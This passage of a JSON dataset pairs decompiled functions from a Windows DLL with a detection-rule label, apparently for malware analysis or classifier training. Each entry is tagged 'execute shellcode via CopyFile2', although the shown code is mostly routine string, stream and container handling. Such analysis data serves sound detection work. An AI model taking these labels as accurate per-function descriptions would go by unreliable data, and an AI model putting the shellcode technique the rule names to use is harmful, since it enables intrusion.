uStack32) {\n            pppppuVar3 = apppppuStack56[0];\n        }\n        fcn.18000fff0(&pcStack328, pppppuVar3, uStack40);\n        if (0xf < uStack32) {\n            pppppuVar3 = apppppuStack56[0];\n            if ((0xfff < uStack32 + 1) &&\n               (pppppuVar3 = apppppuStack56[0][-1],  0x1f < apppppuStack56[0] + (-8 - pppppuVar3))) {\n                fcn.1800b3528();\n                goto code_r0x00018000b372;\n            }\n            fcn.18008fb24(pppppuVar3);\n        }\n    }\n    *(auStack320 + *(pcStack328 + 4) + -8) = vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n    *(&iStack332 + *(pcStack328 + 4)) = *(pcStack328 + 4) + -0xa8;\n    fcn.18000ff30(auStack320);\n    *(auStack320 + *(pcStack328 + 4) + -8) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(&iStack332 + *(pcStack328 + 4)) = *(pcStack328 + 4) + -0x10;\n    apcStack160[0] = vtable.std::ios_base.0;\n    fcn.180073e6c(apcStack160);\n    (**0x1800de4a0)(0, 0, 0, 0);\n    if (7 < arg3[3]) {\n        iVar1 = *arg3;\n        arg1 = iVar1;\n        if ((0xfff < arg3[3] * 2 + 2U) && (arg1 = *(iVar1 + -8),  0x1f < (iVar1 - arg1) - 8U)) {\ncode_r0x00018000b372:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18008fb24(arg1);\n    }\n    arg3[2] = 0;\n    arg3[3] = 7;\n    *arg3 = 0;\n    fcn.18008fb00(uStack24 ^ auStack536);\n    return;\n}\n",
        "token_count": 978
    },
    "18000bd7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.18000bd70(ulong noname_0, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint32_t uVar9;\n    int64_t **arg2_00;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack392 [48];\n    ulong uStack344;\n    int32_t iStack332;\n    code *apcStack328 [2];\n    uint32_t auStack312 [14];\n    int64_t aiStack256 [13];\n    code *apcStack152 [12];\n    int64_t **ppiStack56;\n    uint64_t uStack48;\n    ulong var_10h;\n    \n    uStack344 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack392;\n    ppiStack56 = arg2;\n    fcn.1800ae290(apcStack328, 0, 0x110);\n    arg2_00 = arg2;\n    if (0x7 < arg2[3]) {\n        arg2_00 = *arg2;\n    }\n    fcn.180011470(apcStack328, arg2_00, 0x20);\n    *(apcStack328 + *(apcStack328[0] + 4)) = vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0xb0;\n    if ((*(auStack312 + *(apcStack328[0] + 4)) & 6) == 0) {\n        iVar3 = fcn.18000ec10(apcStack328);\n        iVar4 = fcn.18000ec10(apcStack328);\n        iVar5 = fcn.18000ec10(apcStack328);\n        iVar6 = fcn.180011920(auStack312);\n        if (iVar6 == 0) {\n            iVar6 = *(apcStack328[0] + 4);\n            uVar9 = 6;\n            if (*(aiStack256 + iVar6) != 0) {\n                uVar9 = 2;\n            }\n            fcn.1800037a0(apcStack328 + iVar6, uVar9 | *(auStack312 + iVar6));\n        }\n        if (iVar3 == 0xff) {\n            if (iVar4 == 0xfe) {\n                *(apcStack328 + *(apcStack328[0] + 4)) =\n                     vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n                *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0xb0;\n                fcn.18000ea60(auStack312);\n                *(apcStack328 + *(apcStack328[0] + 4)) =\n                     vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n                *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0x18;\n                apcStack152[0] = vtable.std::ios_base.0;\n                fcn.180073e6c(apcStack152);\n                if (0x7 < arg2[3]) {\n                    iVar6 = arg2[3] * 2;\n                    piVar1 = *arg2;\n                    piVar8 = piVar1;\n                    if (0xfff < iVar6 + 2U) {\n                        iVar6 = iVar6 + 0x29;\n                        piVar8 = piVar1[-1];\n                        iVar7 = piVar1 - piVar8;\n                        if (0x1f < iVar7 - 8U) goto code_r0x00018000c1ba;\n                    }\n                    fcn.18008fb24(piVar8);\n                }\n                goto code_r0x00018000c183;\n            }\n        }\n        else if (iVar3 == 0xfe) {\n            if (iVar4 == 0xff) {\n                *(apcStack328 + *(apcStack328[0] + 4)) =\n                     vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n                *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0xb0;\n                fcn.18000ea60(auStack312);\n                *(apcStack328 + *(apcStack328[0] + 4)) =\n                     vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n                *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0x18;\n                apcStack152[0] = vtable.std::ios_base.0;\n                fcn.180073e6c(apcStack152);\n                if (0x7 < arg2[3]) {\n                    iVar6 = arg2[3] * 2;\n                    piVar1 = *arg2;\n                    piVar8 = piVar1;\n                    if (0xfff < iVar6 + 2U) {\n                        iVar6 = iVar6 + 0x29;\n                        piVar8 = piVar1[-1];\n                        iVar7 = piVar1 - piVar8;\n                        if (0x1f < iVar7 - 8U) {\ncode_r0x00018000c1ba:\n                            fcn.1800b3528(iVar7, iVar6);\n                            pcVar2 = swi(3);\n                            (*pcVar2)();\n                            return;\n                        }\n                    }\n                    fcn.18008fb24(piVar8);\n                }\n                goto code_r0x00018000c183;\n            }\n        }\n        else if (((iVar3 == 0xef) && (iVar4 == 0xbb)) && (iVar5 == 0xbf)) {\n            *(apcStack328 + *(apcStack328[0] + 4)) =\n                 vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n            *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0xb0;\n            fcn.18000ea60(auStack312);\n            *(apcStack328 + *(apcStack328[0] + 4)) =\n                 vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n            *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0x18;\n            apcStack152[0] = vtable.std::ios_base.0;\n            fcn.180073e6c(apcStack152);\n            if (0x7 < arg2[3]) {\n                iVar6 = arg2[3] * 2;\n                piVar1 = *arg2;\n                piVar8 = piVar1;\n                if (0xfff < iVar6 + 2U) {\n                    iVar6 = iVar6 + 0x29;\n                    piVar8 = piVar1[-1];\n                    iVar7 = piVar1 - piVar8;\n                    if (0x1f < iVar7 - 8U) goto code_r0x00018000c1ba;\n                }\n                fcn.18008fb24(piVar8);\n            }\n            goto code_r0x00018000c183;\n        }\n    }\n    *(apcStack328 + *(apcStack328[0] + 4)) = vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0xb0;\n    fcn.18000ea60(auStack312);\n    *(apcStack328 + *(apcStack328[0] + 4)) = vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(&iStack332 + *(apcStack328[0] + 4)) = *(apcStack328[0] + 4) + -0x18;\n    apcStack152[0] = vtable.std::ios_base.0;\n    fcn.180073e6c(apcStack152);\n    if (0x7 < arg2[3]) {\n        iVar6 = arg2[3] * 2;\n        piVar1 = *arg2;\n        piVar8 = piVar1;\n        if (0xfff < iVar6 + 2U) {\n            piVar8 = piVar1[-1];\n            if (0x1f < (piVar1 - piVar8) - 8U) {\n                fcn.1800b3528(piVar1 - piVar8, iVar6 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(piVar8);\n    }\ncode_r0x00018000c183:\n    *arg2 = 0;\n    arg2[3] = 0x7;\n    arg2[2] = NULL;\n    fcn.18008fb00(uStack48 ^ auStack392);\n    return;\n}\n",
        "token_count": 2202
    },
    "180022ab": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180022ab0(int64_t arg1)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    ulong uVar2;\n    uchar *arg1_01;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    ulong var_40h;\n    ulong var_bp_48h;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack392 [32];\n    uchar *puStack360;\n    uchar *puStack352;\n    uchar *puStack344;\n    uchar uStack336;\n    unkbyte7 Stack335;\n    ulong uStack320;\n    uint64_t uStack312;\n    uchar uStack304;\n    unkbyte7 Stack303;\n    ulong uStack288;\n    uint64_t uStack280;\n    uchar uStack272;\n    unkbyte7 Stack271;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    ulong uStack240;\n    uchar auStack232 [32];\n    uchar auStack200 [72];\n    ulong var_78h;\n    ulong var_bp_70h;\n    ulong var_68h;\n    ulong var_60h;\n    int64_t var_40h_2;\n    ulong uStack64;\n    int64_t iStack56;\n    uint64_t uStack48;\n    \n    uStack240 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack392;\n    _var_40h_2 = ZEXT816(0);\n    uVar4 = 0;\n    iStack56 = 0;\n    puStack344 = auStack232;\n    uVar2 = fcn.1800687b0(auStack200);\n    iVar6 = arg1 + 0x40;\n    if (7 < *(arg1 + 0x58)) {\n        iVar6 = *(arg1 + 0x40);\n    }\n    fcn.180068c50(uVar2, auStack232, iVar6, iVar6 + *(arg1 + 0x50) * 2);\n    fcn.1800686c0(auStack200);\n    uStack256 = *0x180101910;\n    uStack252 = *0x180101914;\n    uStack248 = *0x180101918;\n    uStack244 = *0x18010191c;\n    uStack272 = 0;\n    fcn.180011120(&uStack272, 0x1800f4686, 0);\n    uStack288 = CONCAT44(*0x180101914, *0x180101910);\n    uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack304 = 0;\n    fcn.180011120(&uStack304, 0x1800f6048, 9);\n    uStack320 = CONCAT44(*0x180101914, *0x180101910);\n    uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack336 = 0;\n    arg1_01 = &uStack336;\n    fcn.180011120(arg1_01, 0x1800f4c64, 4);\n    puStack352 = auStack232;\n    puStack360 = &uStack272;\n    puStack344._0_4_ = fcn.180009a40(arg1_01, &var_40h_2, &uStack336, &uStack304);\n    uVar8 = puStack344;\n    puStack344 = puStack344 & 0xffffffff00000000 | puStack344;\n    if (uStack312 < 0x10) {\ncode_r0x000180022c24:\n        uStack320 = CONCAT44(*0x180101914, *0x180101910);\n        uStack312 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack336 = 0;\n        if (uStack280 < 0x10) {\ncode_r0x000180022c74:\n            uStack288 = CONCAT44(*0x180101914, *0x180101910);\n            uStack280 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack304 = 0;\n            if (0xf < CONCAT44(uStack244, uStack248)) {\n                iVar3 = CONCAT71(Stack271, uStack272);\n                iVar6 = iVar3;\n                if ((0xfff < CONCAT44(uStack244, uStack248) + 1) &&\n                   (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) goto code_r0x000180022e87;\n                fcn.18008fb24(iVar6);\n            }\n            uStack256 = *0x180101910;\n            uStack252 = *0x180101914;\n            uStack248 = *0x180101918;\n            uStack244 = *0x18010191c;\n            uStack272 = 0;\n            arg1_00 = arg1 + 0xd8;\n            iVar6 = *(arg1 + 0xe0);\n            iVar3 = *arg1_00;\n            if (iVar3 != iVar6) {\n                do {\n                    fcn.180025000(iVar3);\n                    iVar3 = iVar3 + 0xf0;\n                } while (iVar3 != iVar6);\n                iVar3 = *arg1_00;\n            }\n            *(arg1 + 0xe0) = iVar3;\n            iVar9 = *arg1_00;\n            iVar6 = (iVar3 - iVar9) + SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar3 - iVar9) >> 0x40, 0);\n            uVar7 = (iVar6 >> 7) - (iVar6 >> 0x3f);\n            if (uVar8 < uVar7) {\n                iVar9 = uVar8 * 0xf0 + iVar9;\n                for (iVar6 = iVar9; iVar6 != iVar3; iVar6 = iVar6 + 0xf0) {\n                    fcn.180025000(iVar6);\n                }\n                *(arg1 + 0xe0) = iVar9;\n            }\n            else if (uVar7 < uVar8) {\n                iVar9 = *(arg1 + 0xe8) - iVar9;\n                iVar9 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar9) >> 0x40, 0) + iVar9;\n                if ((iVar9 >> 7) - (iVar9 >> 0x3f) < uVar8) {\n                    fcn.18002fb10(arg1_00, uVar8);\n                }\n                else {\n                    uVar2 = fcn.18002f6d0(arg1_00, iVar3, uVar8 - uVar7);\n                    *(arg1 + 0xe0) = uVar2;\n                }\n            }\n            uVar8 = uVar4;\n            if (0 < puStack344) {\n                do {\n                    fcn.180022e90(arg1, uVar8, var_40h_2 + uVar4, arg1 + 0x40);\n                    uVar5 = uVar8 + 1;\n                    uVar4 = uVar4 + 0x20;\n                    uVar8 = uVar5;\n                } while (uVar5 < puStack344);\n            }\n            if (var_40h_2 == 0) goto code_r0x000180022e46;\n            fcn.180013b30(var_40h_2, uStack64);\n            uVar4 = iStack56 - var_40h_2 & 0xffffffffffffffe0;\n            iVar6 = var_40h_2;\n            if (0xfff < uVar4) {\n                iVar6 = *(var_40h_2 + -8);\n                if (0x1f < (var_40h_2 - iVar6) - 8U) {\n                    fcn.1800b3528(iVar6, uVar4 + 0x27);\n                    goto code_r0x000180022e7b;\n                }\n            }\n            fcn.18008fb24(iVar6);\ncode_r0x000180022e46:\n            fcn.18008fb00(uStack48 ^ auStack392);\n            return;\n        }\n        iVar3 = CONCAT71(Stack303, uStack304);\n        iVar6 = iVar3;\n        if ((uStack280 + 1 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180022c74;\n        }\n    }\n    else {\n        iVar3 = CONCAT71(Stack335, uStack336);\n        iVar6 = iVar3;\n        if ((uStack312 + 1 < 0x1000) || (iVar6 = *(iVar3 + -8),  (iVar3 - iVar6) - 8U < 0x20)) {\n            fcn.18008fb24(iVar6);\n            goto code_r0x000180022c24;\n        }\ncode_r0x000180022e7b:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x000180022e87:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2189
    },
    "180024ec": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint64_t fcn.180024ec0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t arg3;\n    int64_t arg2_01;\n    int64_t iVar1;\n    ulong uVar2;\n    \n    fcn.18000da90(arg1, arg2);\n    fcn.18000da90(arg1 + 0x20, arg2 + 0x20);\n    fcn.18000da90(arg1 + 0x40, arg2 + 0x40);\n    *(arg1 + 0x60) = *(arg2 + 0x60);\n    arg1_00 = arg1 + 0x68;\n    *arg1_00 = 0;\n    *(arg1 + 0x70) = 0;\n    *(arg1 + 0x78) = 0;\n    arg2_00 = *(arg2 + 0x68);\n    arg3 = *(arg2 + 0x70);\n    if (arg2_00 != arg3) {\n        arg2_01 = (arg3 - arg2_00) / 0xa0;\n        iVar1 = fcn.18002e1e0(arg3 - arg2_00, arg2_01);\n        *arg1_00 = iVar1;\n        *(arg1 + 0x70) = iVar1;\n        *(arg1 + 0x78) = arg2_01 * 0xa0 + iVar1;\n        uVar2 = fcn.18002efd0(arg1_00, arg2_00, arg3, *arg1_00);\n        *(arg1 + 0x70) = uVar2;\n    }\n    *(arg1 + 0x80) = *(arg2 + 0x80);\n    *(arg1 + 0x88) = *(arg2 + 0x88);\n    fcn.18008ff1c(arg1 + 0x90, arg2 + 0x90, 0x20, 3);\n    return arg1;\n}\n",
        "token_count": 469
    },
    "180027f5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.180027f50(ulong *arg1, ulong *arg2)\n\n{\n    ulong *arg1_00;\n    ulong *puVar1;\n    int64_t *piVar2;\n    ulong *arg2_00;\n    int64_t iVar3;\n    \n    if (arg1 != arg2) {\n        puVar1 = arg2;\n        if (7 < arg2[3]) {\n            puVar1 = *arg2;\n        }\n        fcn.180010d70(arg1, puVar1, arg2[2]);\n    }\n    piVar2 = arg2 + 4;\n    if (arg1 + 4 != piVar2) {\n        if (7 < arg2[7]) {\n            piVar2 = *piVar2;\n        }\n        fcn.180010d70(arg1 + 4, piVar2, arg2[6]);\n    }\n    piVar2 = arg2 + 8;\n    if (arg1 + 8 != piVar2) {\n        if (7 < arg2[0xb]) {\n            piVar2 = *piVar2;\n        }\n        fcn.180010d70(arg1 + 8, piVar2, arg2[10]);\n    }\n    *(arg1 + 0xc) = *(arg2 + 0xc);\n    if (arg1 + 0xd != arg2 + 0xd) {\n        fcn.18002fdc0(arg1 + 0xd, arg2[0xd], arg2[0xe]);\n    }\n    puVar1 = arg2 + 0x12;\n    *(arg1 + 0x10) = *(arg2 + 0x10);\n    *(arg1 + 0x84) = *(arg2 + 0x84);\n    iVar3 = 3;\n    *(arg1 + 0x11) = *(arg2 + 0x11);\n    do {\n        arg1_00 = (arg1 - arg2) + puVar1;\n        if (arg1_00 != puVar1) {\n            arg2_00 = puVar1;\n            if (7 < puVar1[3]) {\n                arg2_00 = *puVar1;\n            }\n            fcn.180010d70(arg1_00, arg2_00, puVar1[2]);\n        }\n        puVar1 = puVar1 + 4;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return arg1;\n}\n",
        "token_count": 549
    },
    "180028ac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.180028ac0(ulong *arg1, ulong *arg2)\n\n{\n    ulong *arg2_00;\n    int64_t *piVar1;\n    \n    if (arg1 != arg2) {\n        arg2_00 = arg2;\n        if (7 < arg2[3]) {\n            arg2_00 = *arg2;\n        }\n        fcn.180010d70(arg1, arg2_00, arg2[2]);\n    }\n    piVar1 = arg2 + 4;\n    if (arg1 + 4 != piVar1) {\n        if (7 < arg2[7]) {\n            piVar1 = *piVar1;\n        }\n        fcn.180010d70(arg1 + 4, piVar1, arg2[6]);\n    }\n    piVar1 = arg2 + 8;\n    if (arg1 + 8 != piVar1) {\n        if (7 < arg2[0xb]) {\n            piVar1 = *piVar1;\n        }\n        fcn.180010d70(arg1 + 8, piVar1, arg2[10]);\n    }\n    piVar1 = arg2 + 0xc;\n    if (arg1 + 0xc != piVar1) {\n        if (7 < arg2[0xf]) {\n            piVar1 = *piVar1;\n        }\n        fcn.180010d70(arg1 + 0xc, piVar1, arg2[0xe]);\n    }\n    piVar1 = arg2 + 0x10;\n    if (arg1 + 0x10 != piVar1) {\n        if (7 < arg2[0x13]) {\n            piVar1 = *piVar1;\n        }\n        fcn.180010d70(arg1 + 0x10, piVar1, arg2[0x12]);\n    }\n    return arg1;\n}\n",
        "token_count": 419
    },
    "18002dba": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002dba0(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint64_t arg2_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack120 [32];\n    ulong uStack88;\n    int64_t *piStack80;\n    int64_t iStack72;\n    uchar auStack64 [16];\n    int64_t *piStack48;\n    uint64_t uStack40;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack120;\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    iVar2 = arg2[1];\n    iVar5 = *arg2;\n    arg2_00 = (iVar2 - iVar5) / 0xa0;\n    if (arg2_00 != 0) {\n        if (0x199999999999999 < arg2_00) {\n            fcn.180014900();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        iVar4 = fcn.18002e1e0(iVar2 - iVar5, arg2_00);\n        *arg1 = iVar4;\n        arg1[1] = iVar4;\n        arg1[2] = arg2_00 * 0xa0 + iVar4;\n        iVar4 = *arg1;\n        auStack64 = CONCAT88(iVar4, iVar4);\n        piStack80 = arg1;\n        piStack48 = arg1;\n        if (iVar5 != iVar2) {\n            iVar5 = iVar5 + 0x40;\n            do {\n                iStack72 = iVar4;\n                fcn.18000da90(iVar4, iVar5 + -0x40);\n                fcn.18000da90(iVar4 + 0x20, iVar5 + -0x20);\n                fcn.18000da90(iVar4 + 0x40, iVar5);\n                fcn.18000da90(iVar4 + 0x60, iVar5 + 0x20);\n                fcn.18000da90(iVar4 + 0x80, iVar5 + 0x40);\n                iVar4 = iVar4 + 0xa0;\n                auStack64 = CONCAT88(iVar4, auStack64._0_8_);\n                iVar1 = iVar5 + 0x60;\n                iVar5 = iVar5 + 0xa0;\n            } while (iVar1 != iVar2);\n        }\n        arg1[1] = iVar4;\n    }\n    fcn.18008fb00(uStack40 ^ auStack120);\n    return;\n}\n",
        "token_count": 632
    },
    "18002efd": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18002efd0(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    uchar auStack88 [32];\n    ulong uStack56;\n    int64_t iStack48;\n    uchar auStack40 [16];\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack88;\n    auStack40 = CONCAT88(arg4, arg4);\n    uStack24 = arg1;\n    if (arg2 != arg3) {\n        arg2_00 = arg2 + 0x40;\n        do {\n            iStack48 = arg4;\n            fcn.18000da90(arg4, arg2_00 + -0x40);\n            fcn.18000da90(arg4 + 0x20, arg2_00 + -0x20);\n            fcn.18000da90(arg4 + 0x40, arg2_00);\n            fcn.18000da90(arg4 + 0x60, arg2_00 + 0x20);\n            fcn.18000da90(arg4 + 0x80, arg2_00 + 0x40);\n            arg4 = arg4 + 0xa0;\n            auStack40 = CONCAT88(arg4, auStack40._0_8_);\n            iVar1 = arg2_00 + 0x60;\n            arg2_00 = arg2_00 + 0xa0;\n        } while (iVar1 != arg3);\n    }\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 399
    },
    "180036d1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180036d10(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    uint uVar3;\n    char in_R8B;\n    uchar auStack120 [32];\n    uint uStack88;\n    uint uStack80;\n    uint uStack72;\n    int32_t iStack56;\n    int32_t iStack52;\n    uchar auStack48 [4];\n    int32_t iStack44;\n    int32_t iStack40;\n    uint64_t uStack32;\n    \n    uStack32 = *0x180123080 ^ auStack120;\n    *(arg1 + 0x30) = arg2;\n    uVar1 = (**0x1800de798)(*(arg1 + 0x18), arg2 + 0x25a9);\n    (**0x1800de700)(uVar1, auStack48);\n    iStack56 = iStack40 + 1;\n    iStack52 = iStack44 + 2;\n    (**0x1800de7e8)(*(arg1 + 0x18), &iStack56);\n    uVar3 = 0;\n    uStack72 = 0x201;\n    uStack80 = 0;\n    uStack88 = 0;\n    (**0x1800de7c8)(*(arg1 + 0xa0), 0, iStack56, iStack52);\n    if (8 < arg2) {\n        uVar2 = 0;\n        if (((*(arg1 + 0xc0) - *(arg1 + 0xb8)) / 0x48 + -1) / 10 <= *(arg1 + 0x34)) goto code_r0x000180036df7;\n    }\n    uVar2 = 1;\ncode_r0x000180036df7:\n    uVar1 = (**0x1800de798)(*(arg1 + 0x18), 0x2526);\n    (**0x1800de770)(uVar1, uVar2);\n    if ((0 < arg2) || (0 < *(arg1 + 0x34))) {\n        uVar3 = 1;\n    }\n    uVar1 = (**0x1800de798)(*(arg1 + 0x18), 0x2527);\n    (**0x1800de770)(uVar1, uVar3);\n    if (in_R8B != '\\0') {\n        uVar1 = (**0x1800de798)(*(arg1 + 0x18), arg2 + 0x2545);\n        (**0x1800de6f0)(uVar1);\n    }\n    fcn.18008fb00(uStack32 ^ auStack120);\n    return;\n}\n",
        "token_count": 607
    },
    "18003bf8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18003bf80(int64_t *arg1, uint64_t arg2)\n\n{\n    uchar (*pauVar1) [16];\n    uint64_t uVar2;\n    int64_t iVar3;\n    uchar (*pauVar4) [16];\n    uchar (*arg1_00) [16];\n    int64_t iVar5;\n    \n    pauVar4 = arg1[1];\n    iVar5 = *arg1;\n    iVar3 = (pauVar4 - iVar5) / 0x12 + (pauVar4 - iVar5 >> 0x3f);\n    uVar2 = (iVar3 >> 2) - (iVar3 >> 0x3f);\n    if (arg2 < uVar2) {\n        pauVar1 = iVar5 + arg2 * 0x48;\n        for (arg1_00 = pauVar1; arg1_00 != pauVar4; arg1_00 = arg1_00[4] + 8) {\n            fcn.180037040(arg1_00);\n        }\n        arg1[1] = pauVar1;\n        return;\n    }\n    if (uVar2 < arg2) {\n        if ((arg1[2] - iVar5) / 0x48 < arg2) {\n            fcn.18003c8b0(arg1, arg2);\n            return;\n        }\n        iVar5 = arg2 - uVar2;\n        if (iVar5 != 0) {\n            pauVar1 = pauVar4[4];\n            do {\n                *pauVar4 = ZEXT816(0);\n                pauVar4[1] = ZEXT816(0);\n                pauVar4[2] = ZEXT816(0);\n                pauVar4[3] = ZEXT816(0);\n                *pauVar4[4] = 0;\n                **pauVar4 = 0;\n                pauVar4 = pauVar4[4] + 8;\n                *pauVar1[-3] = 0;\n                *(pauVar1[-3] + 8) = 7;\n                *pauVar1[-2] = 0;\n                *(pauVar1[-1] + 8) = 0;\n                **pauVar1 = 7;\n                *(pauVar1[-2] + 8) = 0;\n                iVar5 = iVar5 + -1;\n                pauVar1 = pauVar1[4] + 8;\n            } while (iVar5 != 0);\n        }\n        arg1[1] = pauVar4;\n    }\n    return;\n}\n",
        "token_count": 572
    },
    "18003ca5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * fcn.18003ca50(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    ulong *puVar7;\n    uint *puVar8;\n    \n    puVar8 = arg3;\n    if (arg1 != arg2) {\n        puVar7 = arg1 + 8;\n        do {\n            *(arg3 + (-0x30 - arg1) + puVar7) = 0;\n            *(arg3 + (-0x28 - arg1) + puVar7) = 0;\n            uVar4 = *(puVar7 + -0x3c);\n            uVar5 = *(puVar7 + -7);\n            uVar6 = *(puVar7 + -0x34);\n            puVar1 = puVar7 + 9;\n            puVar2 = puVar7 + 1;\n            *puVar8 = *(puVar7 + -8);\n            puVar8[1] = uVar4;\n            puVar8[2] = uVar5;\n            puVar8[3] = uVar6;\n            uVar4 = *(puVar7 + -0x2c);\n            uVar5 = *(puVar7 + -5);\n            uVar6 = *(puVar7 + -0x24);\n            puVar8[4] = *(puVar7 + -6);\n            puVar8[5] = uVar4;\n            puVar8[6] = uVar5;\n            puVar8[7] = uVar6;\n            puVar7[-6] = 0;\n            puVar8 = puVar8 + 0x12;\n            puVar7[-5] = 7;\n            *(puVar7 + -8) = 0;\n            *(arg3 + (-0x68 - arg1) + puVar1) = *(puVar7 + -4);\n            *(arg3 + (-100 - arg1) + puVar1) = *(puVar7 + -0x1c);\n            *(arg3 + (-0x50 - arg1) + puVar1) = 0;\n            *(arg3 + (-0x48 - arg1) + puVar1) = 0;\n            uVar4 = *(puVar7 + -0x14);\n            uVar5 = *(puVar7 + -2);\n            uVar6 = *(puVar7 + -0xc);\n            puVar3 = arg3 + (-0x60 - arg1) + puVar1;\n            *puVar3 = *(puVar7 + -3);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar7 + -4);\n            uVar5 = *puVar7;\n            uVar6 